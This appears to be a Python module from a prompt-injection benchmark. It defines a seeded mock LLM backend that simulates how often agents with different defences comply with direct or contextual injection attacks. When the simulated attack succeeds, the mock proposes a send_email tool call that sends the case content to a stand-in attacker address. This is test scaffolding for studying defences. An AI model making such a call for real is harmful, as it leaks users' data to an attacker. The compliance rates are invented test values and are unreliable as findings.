from __future__ import annotations

import hashlib
import random
import re
from abc import ABC, abstractmethod

from .types import Action, BenchmarkCase, ModelResponse


class LLMBackend(ABC):
    name: str

    @abstractmethod
    def generate(self, prompt: str, case: BenchmarkCase, attack_mode: str, architecture: str, seed: int) -> ModelResponse:
        raise NotImplementedError


class MockLLMBackend(LLMBackend):
    """Seeded behavioral mock for plumbing tests, never scientific inference."""

    name = "mock-llm-v1"
    _compliance = {
        "naive": {"clean": 0.02, "direct": 0.72, "contextual": 0.48},
        "prompt_defense": {"clean": 0.01, "direct": 0.28, "contextual": 0.38},
        "policy_gate": {"clean": 0.02, "direct": 0.72, "contextual": 0.48},
    }

    def generate(self, prompt: str, case: BenchmarkCase, attack_mode: str, architecture: str, seed: int) -> ModelResponse:
        digest = hashlib.sha256(f"{seed}|{case.id}|{attack_mode}|{architecture}".encode()).digest()
        rng = random.Random(int.from_bytes(digest[:8], "big"))
        words = re.findall(r"[\w:-]+", case.clean_content.lower())
        task_output = "Summary: " + " ".join(words)
        proposals: list[Action] = []
        if rng.random() < self._compliance[architecture][attack_mode]:
            proposals.append(Action(tool="send_email", parameters={"recipient": "attacker@example.com", "body": case.clean_content}))
        raw = task_output + ("\nTOOL send_email" if proposals else "")
        return ModelResponse(
            task_output=task_output,
            proposed_actions=proposals,
            raw_output=raw,
            input_tokens=len(prompt.split()),
            output_tokens=len(raw.split()),
        )
